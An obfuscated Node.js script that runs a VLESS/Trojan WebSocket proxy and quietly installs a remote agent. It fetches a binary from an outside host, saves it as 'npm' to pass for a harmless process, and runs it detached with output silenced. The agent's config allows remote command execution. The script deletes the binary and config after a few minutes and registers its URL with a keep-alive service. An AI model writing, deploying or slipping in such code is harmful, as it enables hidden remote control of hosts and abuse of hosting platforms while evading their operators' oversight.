const _0x2938bf=_0x5622;(function(_0x32c025,_0x3ec44e){const _0x36b0ce=_0x5622,_0x94b720=_0x32c025();while(!![]){try{const _0x322368=-parseInt(_0x36b0ce(0x15a))/0x1*(parseInt(_0x36b0ce(0x135))/0x2)+-parseInt(_0x36b0ce(0x13f))/0x3*(-parseInt(_0x36b0ce(0x12c))/0x4)+-parseInt(_0x36b0ce(0x144))/0x5*(parseInt(_0x36b0ce(0x17f))/0x6)+parseInt(_0x36b0ce(0x14a))/0x7*(parseInt(_0x36b0ce(0x170))/0x8)+-parseInt(_0x36b0ce(0x147))/0x9+parseInt(_0x36b0ce(0x169))/0xa+parseInt(_0x36b0ce(0x182))/0xb;if(_0x322368===_0x3ec44e)break;else _0x94b720['push'](_0x94b720['shift']());}catch(_0x1db15e){_0x94b720['push'](_0x94b720['shift']());}}}(_0x4017,0x968a6));const os=require('os'),http=require(_0x2938bf(0x122)),fs=require('fs'),axios=require(_0x2938bf(0x165)),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require(_0x2938bf(0x121)),{exec,execSync}=require(_0x2938bf(0x159)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2938bf(0x18f)]||_0x2938bf(0x167),NEZHA_SERVER=process['env'][_0x2938bf(0x134)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x2938bf(0x138)]||'',DOMAIN=process['env'][_0x2938bf(0x143)]||'1234.abc.com',AUTO_ACCESS=process[_0x2938bf(0x188)][_0x2938bf(0x190)]||![],WSPATH=process[_0x2938bf(0x188)][_0x2938bf(0x124)]||UUID[_0x2938bf(0x127)](0x0,0x8),SUB_PATH=process[_0x2938bf(0x188)][_0x2938bf(0x164)]||_0x2938bf(0x17e),NAME=process[_0x2938bf(0x188)][_0x2938bf(0x149)]||'',PORT=process[_0x2938bf(0x188)][_0x2938bf(0x197)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x2db72d=_0x2938bf;try{const _0x587b0d=await axios[_0x2db72d(0x136)](_0x2db72d(0x148)),_0x5684c8=_0x587b0d[_0x2db72d(0x15c)];ISP=(_0x5684c8[_0x2db72d(0x14f)]+'-'+_0x5684c8[_0x2db72d(0x183)])[_0x2db72d(0x12d)](/ /g,'_');}catch(_0x2cf615){ISP=_0x2db72d(0x15d);}};GetISP();const httpServer=http[_0x2938bf(0x16e)]((_0x29a327,_0x3c1af8)=>{const _0x19c34d=_0x2938bf;if(_0x29a327[_0x19c34d(0x12f)]==='/'){const _0x3f703b=path['join'](__dirname,_0x19c34d(0x196));fs['readFile'](_0x3f703b,_0x19c34d(0x17b),(_0x564bae,_0x5d97ab)=>{const _0x4bc5e1=_0x19c34d;if(_0x564bae){_0x3c1af8[_0x4bc5e1(0x155)](0xc8,{'Content-Type':_0x4bc5e1(0x128)}),_0x3c1af8[_0x4bc5e1(0x12a)](_0x4bc5e1(0x16d));return;}_0x3c1af8[_0x4bc5e1(0x155)](0xc8,{'Content-Type':_0x4bc5e1(0x128)}),_0x3c1af8[_0x4bc5e1(0x12a)](_0x5d97ab);});return;}else{if(_0x29a327[_0x19c34d(0x12f)]==='/'+SUB_PATH){const _0x20c75b=NAME?NAME+'-'+ISP:ISP,_0x2f0615=_0x19c34d(0x18e)+UUID+_0x19c34d(0x13a)+DOMAIN+_0x19c34d(0x133)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x20c75b,_0x410655=_0x19c34d(0x142)+UUID+_0x19c34d(0x157)+DOMAIN+_0x19c34d(0x133)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x20c75b,_0x3a31d6=_0x2f0615+'\x0a'+_0x410655,_0x334def=Buffer['from'](_0x3a31d6)[_0x19c34d(0x195)](_0x19c34d(0x16a));_0x3c1af8[_0x19c34d(0x155)](0xc8,{'Content-Type':_0x19c34d(0x180)}),_0x3c1af8['end'](_0x334def+'\x0a');}else _0x3c1af8[_0x19c34d(0x155)](0x194,{'Content-Type':_0x19c34d(0x180)}),_0x3c1af8[_0x19c34d(0x12a)](_0x19c34d(0x174));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2938bf(0x12d)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x2938bf(0x175)];function resolveHost(_0x536018){return new Promise((_0x9bbe89,_0x18a5e9)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x536018)){_0x9bbe89(_0x536018);return;}let _0x3b7a41=0x0;function _0x231336(){const _0x4cfebf=_0x5622;if(_0x3b7a41>=DNS_SERVERS['length']){_0x18a5e9(new Error(_0x4cfebf(0x186)+_0x536018+_0x4cfebf(0x171)));return;}const _0x15c293=DNS_SERVERS[_0x3b7a41];_0x3b7a41++;const _0x41a6c7='https://dns.google/resolve?name='+encodeURIComponent(_0x536018)+'&type=A';axios[_0x4cfebf(0x136)](_0x41a6c7,{'timeout':0x1388,'headers':{'Accept':_0x4cfebf(0x16c)}})[_0x4cfebf(0x150)](_0x13a552=>{const _0x172154=_0x4cfebf,_0x3201ee=_0x13a552[_0x172154(0x15c)];if(_0x3201ee[_0x172154(0x163)]===0x0&&_0x3201ee[_0x172154(0x123)]&&_0x3201ee['Answer']['length']>0x0){const _0x13df0f=_0x3201ee[_0x172154(0x123)][_0x172154(0x156)](_0x1adef0=>_0x1adef0[_0x172154(0x125)]===0x1);if(_0x13df0f){_0x9bbe89(_0x13df0f[_0x172154(0x15c)]);return;}}_0x231336();})[_0x4cfebf(0x120)](_0x814e2a=>{_0x231336();});}_0x231336();});}function handleVlessConnection(_0x11a084,_0x33883c){const _0x3f0a6c=_0x2938bf,[_0x5edb70]=_0x33883c,_0xadaaaa=_0x33883c['slice'](0x1,0x11);if(!_0xadaaaa[_0x3f0a6c(0x166)]((_0x4c8f51,_0x40b185)=>_0x4c8f51==parseInt(uuid['substr'](_0x40b185*0x2,0x2),0x10)))return![];let _0x5b857b=_0x33883c[_0x3f0a6c(0x127)](0x11,0x12)['readUInt8']()+0x13;const _0x2d4afc=_0x33883c['slice'](_0x5b857b,_0x5b857b+=0x2)[_0x3f0a6c(0x15e)](0x0),_0x3a9a54=_0x33883c[_0x3f0a6c(0x127)](_0x5b857b,_0x5b857b+=0x1)['readUInt8'](),_0x2a9eac=_0x3a9a54==0x1?_0x33883c['slice'](_0x5b857b,_0x5b857b+=0x4)[_0x3f0a6c(0x191)]('.'):_0x3a9a54==0x2?new TextDecoder()['decode'](_0x33883c[_0x3f0a6c(0x127)](_0x5b857b+0x1,_0x5b857b+=0x1+_0x33883c['slice'](_0x5b857b,_0x5b857b+0x1)[_0x3f0a6c(0x130)]())):_0x3a9a54==0x3?_0x33883c[_0x3f0a6c(0x127)](_0x5b857b,_0x5b857b+=0x10)[_0x3f0a6c(0x185)]((_0x3ef484,_0x5eddf6,_0x2b320d,_0x54f11e)=>_0x2b320d%0x2?_0x3ef484[_0x3f0a6c(0x146)](_0x54f11e[_0x3f0a6c(0x127)](_0x2b320d-0x1,_0x2b320d+0x1)):_0x3ef484,[])[_0x3f0a6c(0x192)](_0x24c04e=>_0x24c04e[_0x3f0a6c(0x15e)](0x0)['toString'](0x10))[_0x3f0a6c(0x191)](':'):'';_0x11a084[_0x3f0a6c(0x17c)](new Uint8Array([_0x5edb70,0x0]));const _0x17441d=createWebSocketStream(_0x11a084);return resolveHost(_0x2a9eac)[_0x3f0a6c(0x150)](_0x31e626=>{const _0x183f77=_0x3f0a6c;net['connect']({'host':_0x31e626,'port':_0x2d4afc},function(){const _0x44a85f=_0x5622;this[_0x44a85f(0x151)](_0x33883c['slice'](_0x5b857b)),_0x17441d['on'](_0x44a85f(0x141),()=>{})[_0x44a85f(0x16b)](this)['on'](_0x44a85f(0x141),()=>{})[_0x44a85f(0x16b)](_0x17441d);})['on'](_0x183f77(0x141),()=>{});})[_0x3f0a6c(0x120)](_0x746f6d=>{const _0x3145c0=_0x3f0a6c;net[_0x3145c0(0x162)]({'host':_0x2a9eac,'port':_0x2d4afc},function(){const _0xa7bc5a=_0x3145c0;this[_0xa7bc5a(0x151)](_0x33883c[_0xa7bc5a(0x127)](_0x5b857b)),_0x17441d['on']('error',()=>{})['pipe'](this)['on'](_0xa7bc5a(0x141),()=>{})['pipe'](_0x17441d);})['on'](_0x3145c0(0x141),()=>{});}),!![];}function handleTrojanConnection(_0x1c9868,_0x31a4ee){const _0x340608=_0x2938bf;try{if(_0x31a4ee[_0x340608(0x194)]<0x3a)return![];const _0x26436e=_0x31a4ee['slice'](0x0,0x38)[_0x340608(0x195)](),_0x333656=[UUID];let _0x2b6e54=null;for(const _0x19e3bf of _0x333656){const _0x1612d1=crypto[_0x340608(0x126)](_0x340608(0x18a))[_0x340608(0x193)](_0x19e3bf)[_0x340608(0x132)]('hex');if(_0x1612d1===_0x26436e){_0x2b6e54=_0x19e3bf;break;}}if(!_0x2b6e54)return![];let _0x4a3c46=0x38;_0x31a4ee[_0x4a3c46]===0xd&&_0x31a4ee[_0x4a3c46+0x1]===0xa&&(_0x4a3c46+=0x2);const _0x504576=_0x31a4ee[_0x4a3c46];if(_0x504576!==0x1)return![];_0x4a3c46+=0x1;const _0x21ce9a=_0x31a4ee[_0x4a3c46];_0x4a3c46+=0x1;let _0x1249bf,_0x5af5f7;if(_0x21ce9a===0x1)_0x1249bf=_0x31a4ee[_0x340608(0x127)](_0x4a3c46,_0x4a3c46+0x4)[_0x340608(0x191)]('.'),_0x4a3c46+=0x4;else{if(_0x21ce9a===0x3){const _0xe0b766=_0x31a4ee[_0x4a3c46];_0x4a3c46+=0x1,_0x1249bf=_0x31a4ee['slice'](_0x4a3c46,_0x4a3c46+_0xe0b766)[_0x340608(0x195)](),_0x4a3c46+=_0xe0b766;}else{if(_0x21ce9a===0x4)_0x1249bf=_0x31a4ee[_0x340608(0x127)](_0x4a3c46,_0x4a3c46+0x10)[_0x340608(0x185)]((_0x5b1bbc,_0x1bdb43,_0x2d6bb1,_0x172cc4)=>_0x2d6bb1%0x2?_0x5b1bbc[_0x340608(0x146)](_0x172cc4[_0x340608(0x127)](_0x2d6bb1-0x1,_0x2d6bb1+0x1)):_0x5b1bbc,[])['map'](_0x3fa1b0=>_0x3fa1b0[_0x340608(0x15e)](0x0)[_0x340608(0x195)](0x10))['join'](':'),_0x4a3c46+=0x10;else return![];}}_0x5af5f7=_0x31a4ee['readUInt16BE'](_0x4a3c46),_0x4a3c46+=0x2;_0x4a3c46<_0x31a4ee[_0x340608(0x194)]&&_0x31a4ee[_0x4a3c46]===0xd&&_0x31a4ee[_0x4a3c46+0x1]===0xa&&(_0x4a3c46+=0x2);const _0x1c5793=createWebSocketStream(_0x1c9868);return resolveHost(_0x1249bf)[_0x340608(0x150)](_0x571a95=>{const _0x1f86eb=_0x340608;net[_0x1f86eb(0x162)]({'host':_0x571a95,'port':_0x5af5f7},function(){const _0x4704c6=_0x1f86eb;_0x4a3c46<_0x31a4ee[_0x4704c6(0x194)]&&this['write'](_0x31a4ee[_0x4704c6(0x127)](_0x4a3c46)),_0x1c5793['on'](_0x4704c6(0x141),()=>{})[_0x4704c6(0x16b)](this)['on'](_0x4704c6(0x141),()=>{})['pipe'](_0x1c5793);})['on']('error',()=>{});})[_0x340608(0x120)](_0x160c65=>{const _0x3638e2=_0x340608;net[_0x3638e2(0x162)]({'host':_0x1249bf,'port':_0x5af5f7},function(){const _0x224e08=_0x3638e2;_0x4a3c46<_0x31a4ee[_0x224e08(0x194)]&&this['write'](_0x31a4ee[_0x224e08(0x127)](_0x4a3c46)),_0x1c5793['on'](_0x224e08(0x141),()=>{})[_0x224e08(0x16b)](this)['on']('error',()=>{})['pipe'](_0x1c5793);})['on'](_0x3638e2(0x141),()=>{});}),!![];}catch(_0x2251bf){return![];}}wss['on'](_0x2938bf(0x137),(_0x20fd81,_0x2a3470)=>{const _0x51ee9e=_0x2938bf,_0x467436=_0x2a3470[_0x51ee9e(0x12f)]||'';_0x20fd81[_0x51ee9e(0x158)](_0x51ee9e(0x153),_0x3107e4=>{const _0x551863=_0x51ee9e;if(_0x3107e4[_0x551863(0x194)]>0x11&&_0x3107e4[0x0]===0x0){const _0x47a5de=_0x3107e4['slice'](0x1,0x11),_0x33b8f1=_0x47a5de[_0x551863(0x166)]((_0x303876,_0x2d3df8)=>_0x303876==parseInt(uuid[_0x551863(0x168)](_0x2d3df8*0x2,0x2),0x10));if(_0x33b8f1){!handleVlessConnection(_0x20fd81,_0x3107e4)&&_0x20fd81['close']();return;}}!handleTrojanConnection(_0x20fd81,_0x3107e4)&&_0x20fd81['close']();})['on'](_0x51ee9e(0x141),()=>{});});function _0x4017(){const _0x1c5b2d=['unlink','true','listen','utf8','send','application/json','sub','56196NtfoAE','text/plain','https://arm64.ssss.nyc.mn/agent','3442065wwxyVk','isp','\x20-p\x20','reduce','Failed\x20to\x20resolve\x20','2096','env','includes','sha224','error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','post','vless://','UUID','AUTO_ACCESS','join','map','update','length','toString','index.html','PORT','catch','buffer','http','Answer','WSPATH','type','createHash','slice','text/html','arm64','end','setsid\x20nohup\x20./npm\x20-s\x20','20tJTQlh','replace','https://','url','readUInt8','npm\x20is\x20already\x20running,\x20skip\x20running...','digest','&fp=chrome&type=ws&host=','NEZHA_SERVER','1910gbOVNt','get','connection','NEZHA_KEY','npm','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','trim','443','https://oooo.serv00.net/add-url','chmod\x20+x\x20npm','355689cfYfIX','false','error','trojan://','DOMAIN','155LeKpMN','arm','concat','7460685ACffxK','https://api.ip.sb/geoip','NAME','7gAUmcH','log','npm\x20is\x20running','npm\x20running\x20error:','https://amd64.ssss.nyc.mn/agent','country_code','then','write','arch','message','config.yaml','writeHead','find','@cdns.doon.eu.org:443?security=tls&sni=','once','child_process','633qlbUzN','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','data','Unknown','readUInt16BE','8443','2053','2087','connect','Status','SUB_PATH','axios','every','d8c19580-d0bd-4018-ae49-bfcd92cf4dd3','substr','6686310ryncfq','base64','pipe','application/dns-json','Hello\x20world!','createServer','stream','6128632GHKbfi','\x20with\x20all\x20DNS\x20servers','writeFileSync','pop','Not\x20Found\x0a','1.1.1.1','--tls','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'];_0x4017=function(){return _0x1c5b2d;};return _0x4017();}const getDownloadUrl=()=>{const _0x51839d=_0x2938bf,_0x1c1458=os[_0x51839d(0x152)]();return _0x1c1458===_0x51839d(0x145)||_0x1c1458===_0x51839d(0x129)||_0x1c1458==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x51839d(0x181):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x51839d(0x14e);},downloadFile=async()=>{const _0x4434ae=_0x2938bf;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x41a21a=getDownloadUrl(),_0x5c1349=await axios({'method':_0x4434ae(0x136),'url':_0x41a21a,'responseType':_0x4434ae(0x16f)}),_0x12085a=fs['createWriteStream'](_0x4434ae(0x139));return _0x5c1349[_0x4434ae(0x15c)][_0x4434ae(0x16b)](_0x12085a),new Promise((_0x36ede1,_0x1a3197)=>{const _0x120fe1=_0x4434ae;_0x12085a['on']('finish',()=>{const _0x6f145f=_0x5622;console[_0x6f145f(0x14b)]('npm\x20download\x20successfully'),exec(_0x6f145f(0x13e),_0x51e005=>{if(_0x51e005)_0x1a3197(_0x51e005);_0x36ede1();});}),_0x12085a['on'](_0x120fe1(0x141),_0x1a3197);});}catch(_0x17c24b){throw _0x17c24b;}},runnz=async()=>{const _0x3e4a41=_0x2938bf;try{const _0x3e9819=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x3e9819[_0x3e4a41(0x13b)]()!==''){console['log'](_0x3e4a41(0x131));return;}}catch(_0x50ab77){}await downloadFile();let _0x354d44='',_0x6d5998=[_0x3e4a41(0x13c),_0x3e4a41(0x15f),_0x3e4a41(0x187),_0x3e4a41(0x161),'2083',_0x3e4a41(0x160)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x497cdc=_0x6d5998['includes'](NEZHA_PORT)?_0x3e4a41(0x176):'';_0x354d44=_0x3e4a41(0x12b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3e4a41(0x184)+NEZHA_KEY+'\x20'+_0x497cdc+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5915bf=NEZHA_SERVER[_0x3e4a41(0x189)](':')?NEZHA_SERVER['split'](':')[_0x3e4a41(0x173)]():'',_0x41388b=_0x6d5998[_0x3e4a41(0x189)](_0x5915bf)?_0x3e4a41(0x179):_0x3e4a41(0x140),_0x3b1836='client_secret:\x20'+NEZHA_KEY+_0x3e4a41(0x177)+NEZHA_SERVER+_0x3e4a41(0x18c)+_0x41388b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3e4a41(0x172)]('config.yaml',_0x3b1836);}_0x354d44='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x3e4a41(0x14b)](_0x3e4a41(0x15b));return;}}try{exec(_0x354d44,{'shell':'/bin/bash'},_0x5b01e2=>{const _0x5f0c6a=_0x3e4a41;if(_0x5b01e2)console['error'](_0x5f0c6a(0x14d),_0x5b01e2);else console[_0x5f0c6a(0x14b)](_0x5f0c6a(0x14c));});}catch(_0x8a9459){console[_0x3e4a41(0x141)](_0x3e4a41(0x18b)+_0x8a9459);}};function _0x5622(_0x14b5fc,_0xf04c5d){_0x14b5fc=_0x14b5fc-0x120;const _0x4017ca=_0x4017();let _0x5622ef=_0x4017ca[_0x14b5fc];return _0x5622ef;}async function addAccessTask(){const _0x149e7a=_0x2938bf;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x252d53=_0x149e7a(0x12e)+DOMAIN+'/'+SUB_PATH;try{const _0x1edec0=await axios[_0x149e7a(0x18d)](_0x149e7a(0x13d),{'url':_0x252d53},{'headers':{'Content-Type':_0x149e7a(0x17d)}});console[_0x149e7a(0x14b)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x47ef6d){}}const delFiles=()=>{const _0x1f8233=_0x2938bf;fs[_0x1f8233(0x178)](_0x1f8233(0x139),()=>{}),fs[_0x1f8233(0x178)](_0x1f8233(0x154),()=>{});};httpServer[_0x2938bf(0x17a)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
